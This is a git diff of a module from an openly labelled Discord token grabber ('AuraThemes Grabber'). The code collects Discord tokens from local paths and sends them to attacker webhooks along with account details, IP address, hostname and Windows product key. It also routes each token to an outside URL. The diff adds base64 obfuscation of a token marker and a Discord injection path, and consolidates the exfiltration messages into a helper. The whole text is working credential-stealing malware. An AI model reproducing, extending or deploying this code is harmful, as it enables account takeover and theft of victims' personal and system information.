@@ -2,6 +2,9 @@ const { get_info } = require("./../../modules/core/core.js");
 const { get_discord_Info } = require("./../../utils/axios/discord.js");
 
 const { instance } = require("./../../utils/axios/request.js");
+const { decode_B64, notify } = require("./../../utils/functions/functions.js");
+
+const { inject_path } = require("./../injections/discord.js");
 
 const { tokens, get_tokens } = require("./finds.js");
 
@@ -50,8 +53,8 @@ const send_webhook_tokens = async (webhook) => {
     for (const path of paths) await get_tokens(path);
     for (let token of tokens) {
 
-        let token_type = token.includes("browsers_tokens_") ? "Browser Token" : "Token";
-            token = token.replace("browsers_tokens_", "");
+        let token_type = token.includes(decode_B64("YnJvd3NlcnNfdG9rZW5zXw"));
+            token = token.replace(decode_B64("YnJvd3NlcnNfdG9rZW5zXw"), "");
 
         try {
             let infos;
@@ -69,162 +72,33 @@ const send_webhook_tokens = async (webhook) => {
             }
             if (!infos) continue;
 
-            const copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
-            const discord = await get_discord_Info(token);
+            let copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
+            const discord = {
+                ...await get_discord_Info(token),
+                token_type,
+                copy,
+                inject_path
+            };
             const system = await get_info();
 
             webhook.forEach(async (webhook) => {
-                try {
-                    await instance({
-                        "url": webhook,
-                        "method": "POST",
-                        "data": {
-                            "username": 'AuraThemes Grabber',
-                            "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
-                            "embeds": [{
-                                "author": {
-                                    "name": `${discord.username} | ${discord.ID}`,
-                                    "icon_url": discord.avatar
-                                },
-                                "thumbnail": {
-                                    "url": discord.avatar
-                                },
-                                "title": 'Initialized Grabber',
-                                "color": "12740607",
-                                "fields": [
-                                    { "name": `<a:aura:1087044506542674091> ${token_type}:`, "value": "```" + token + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
-                                    { "name": "<a:aura:1101739920319590420> Nitro:", "value": `${discord.nitroType}`, inline: true },
-                                    { "name": "<a:aura:995172580988309664> IP Adress", "value": `\`${system.IP}\``, inline: true },
-                                    { "name": "<a:aura:863691953531125820> Phone", "value": `\`${discord.phone}\``, inline: true },
-                                    { "name": "<:aura:974711605927505990> Email", "value": `\`${discord.mail}\``, inline: true },
-                                    { "name": "Badges", "value": `${discord.badges}`, "inline": true },
-                                    { "name": "Billing", "value": `${discord.billing}`, "inline": true },
-                                    { "name": "Language", "value": `${discord.langue}`, "inline": true },
-                                ],
-                                "timestamp": new Date(),
-                                "footer": {
-                                    "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
-                                    "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
-                                }
-                            }]
-                        },
-                    });
-
-                    setTimeout(() => instance({
-                        "url": webhook,
-                        "method": "POST",
-                        "data": {
-                            "username": 'AuraThemes Grabber',
-                            "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
-                            "embeds": [{
-                                "author": {
-                                    "name": `${discord.username} | ${discord.ID}`,
-                                    "icon_url": discord.avatar
-                                },
-                                "thumbnail": {
-                                    "url": discord.avatar
-                                },
-                                "title": 'HQ Guild(s)',
-                                "color": "12740607",
-                                "description": `${discord.rare?.guilds}`,
-                                "timestamp": new Date(),
-                                "footer": {
-                                    "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
-                                    "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
-                                }
-                            }]
-                        },
-                    }), 50);
-
-                    setTimeout(() => instance({
-                        "url": webhook,
-                        "method": "POST",
-                        "data": {
-                            "username": 'AuraThemes Grabber',
-                            "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
-                            "embeds": [{
-                                "author": {
-                                    "name": `${discord.username} | ${discord.ID}`,
-                                    "icon_url": discord.avatar
-                                },
-                                "thumbnail": {
-                                    "url": discord.avatar
-                                },
-                                "title": 'HQ Friend(s)',
-                                "color": "12740607",
-                                "description": `${discord.rare?.friends}`,
-                                "timestamp": new Date(),
-                                "footer": {
-                                    "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
-                                    "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
-                                }
-                            }]
-                        },
-                    }), 100);
-
-                    setTimeout(() => instance({
-                        "url": webhook,
-                        "method": "POST",
-                        "data": {
-                            "username": 'AuraThemes Grabber',
-                            "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
-                            "embeds": [{
-                                "author": {
-                                    "name": `${discord.username} | ${discord.ID}`,
-                                    "icon_url": discord.avatar
-                                },
-                                "thumbnail": {
-                                    "url": discord.avatar
-                                },
-                                "title": 'User Information(s)',
-                                "color": "12740607",
-                                "description": `**NSFW**${discord.NSFW}\n**Status**${discord.status}\n**Owner Servers**\`${discord.totalOwnedGuild}\`\n**Connection**\`${discord.totalConnection}\`\n**BOTS/RPC**\`${discord.totalApplication}\`\n**Blocked**\`${discord.totalBlocked}\`\n**Servers**\`${discord.totalGuild}\`\n**Friends**\`${discord.totalFriend}\`\n**Theme**\`${discord.theme}\`\n**Pending**\`${discord.pending}\`\n\n**Biography**\`\`\`yml\n${discord.bio === "has no description" ? "Not found" : discord.bio}\n\`\`\``,
-                                "timestamp": new Date(),
-                                "footer": {
-                                    "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
-                                    "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
-                                }
-                            }]
-                        },
-                    }), 150);
-
-                    setTimeout(() => instance({
-                        "url": webhook,
-                        "method": "POST",
-                        "data": {
-                            "username": 'AuraThemes Grabber',
-                            "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
-                            "embeds": [{
-                                "author": {
-                                    "name": `${discord.username} | ${discord.ID}`,
-                                    "icon_url": discord.avatar
-                                },
-                                "thumbnail": {
-                                    "url": discord.avatar
-                                },
-                                "title": 'System Information(s)',
-                                "color": "12740607",
-                                "fields": [
-                                    { "name": "User", "value": `\`\`\`yml\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.COMPUTERNAME}\`\`\``, inline: false },
-                                    { "name": "System", "value": `\`\`\`yml\nCPU: ${system.CPU}\nUUID: ${system.UID}\nRAM: ${system.RAM}\nMac Address: Not found\nProduct Key: ${system.WINDOWS_KEY}\nLOCAL IP: Not found\nOS Version: ${system.WINDOWS_VERSION}\`\`\``, inline: false },
-                                    { "name": "Network", "value": `\`\`\`yml\nPUBLIC: ${system.IP}\nCountry: Not found\nRegion: Not found\nCity: Not found\nLatitude: Not found\nLongitude: Not found\nISP: Not found\nTime Zone: Not found\nCurrency Code: Not found\`\`\``, inline: false },
-                                ],
-                                "timestamp": new Date(),
-                                "footer": {
-                                    "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
-                                    "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
-                                }
-                            }]
-                        },
-                    }), 200);
-                } catch (error) {
-                    console.error("Error sending request to webhook:", error.message);
+                const msg = {
+                    "title": "Initialized Grabber",
+                    "embeds": [{
+                        "fields": [{
+                            "name": `<a:aura:1087044506542674091> ${discord.token_type ? "Browser Token" : "Token"}:`,
+                            "value": `\`\`\`${discord.token}\`\`\`\n[[Click Here To Copy Your Token]](${discord.copy})`,
+                            "inline": false
+                        }],
+                    }]
                 }
+                notify(webhook, instance, msg, discord, system);
             })
-            instance.get(copy);
+
             continue;
         } catch (e) {
-            return
+            console.error(e);
+            return;
         }
     }
 }
